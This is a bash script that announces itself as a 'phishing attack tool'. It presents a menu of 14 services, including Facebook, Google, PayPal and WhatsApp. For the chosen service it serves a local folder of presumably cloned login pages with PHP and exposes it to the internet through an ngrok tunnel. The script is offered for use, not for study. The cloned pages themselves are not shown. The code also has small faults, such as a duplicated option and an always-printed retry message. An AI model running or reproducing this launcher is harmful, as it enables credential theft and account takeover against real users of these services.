#!/bin/bash

echo "WELCOME TO  PHISHING ATTACK TOOLS"
echo ' _   _    _     _   _   _       '
echo '| | / /  | |   / / | | | |      '
echo '| |/ /   | |  / /  | |_| |      '
echo '| |\ \   | | / /   \___  |      '
echo '| | \ \  | |/ /        | |      '
echo '|_|  \_\ |___/         |_| KV4 '      
echo '      ' 
echo 'Website ==> arasmamhoud.softr.app '
echo 'Instagram ==> almcompany6 ' 
echo 'Linkedin ==> almcompany '
echo 'Udemy ==> Arasmahmoud '
echo "    "
echo " [1] FACEBOOK      [8] paypal "
echo " [2] GITHUB        [9] snapchat "
echo " [3] GOOGLE        [10] telegram "
echo " [4] INSTAGRAM     [11] tiktok "
echo " [5] TWITTER       [12] twitch "
echo " [6] linkedin      [13] whatsapp "
echo " [7] netflix       [14] wordpress "
echo "       "

echo " select the number >> "
read n

if [ $n -eq 1 ];
then
	echo "please wait ...."
	sleep 0.5
	cd sites && cd facebook && php -S localhost:4444 & ./ngrok http 4444

elif [ $n -eq 2 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd github && php -S localhost:4444 & ./ngrok http 4444

elif [ $n -eq 2 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd github && php -S localhost:4444 & ./ngrok http 4444

elif [ $n -eq 3 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd google && php -S localhost:4444 & ./ngrok http 4444

elif [ $n -eq 4 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd instgram && php -S localhost:4444 & ./ngrok http 4444

elif [ $n -eq 5 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd twitter && php -S localhost:4444 & ./ngrok http 4444
	
elif [ $n -eq 6 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd linkedin && php -S localhost:4444 & ./ngrok http 4444
elif [ $n -eq 7 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd netflix && php -S localhost:4444 & ./ngrok http 4444
elif [ $n -eq 8 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd paypal && php -S localhost:4444 & ./ngrok http 4444

elif [ $n -eq 9 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd snapchat && php -S localhost:4444 & ./ngrok http 4444

elif [ $n -eq 10 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd telegram && php -S localhost:4444 & ./ngrok http 4444

elif [ $n -eq 11 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd tiktok && php -S localhost:4444 & ./ngrok http 4444

elif [ $n -eq 12 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd twitch && php -S localhost:4444 & ./ngrok http 4444
	
elif [ $n -eq 13 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd whatsapp && php -S localhost:4444 & ./ngrok http 4444

elif [ $n -eq 14 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd wordpress && php -S localhost:4444 & ./ngrok http 4444

fi
    echo " please try again....." 
    exit
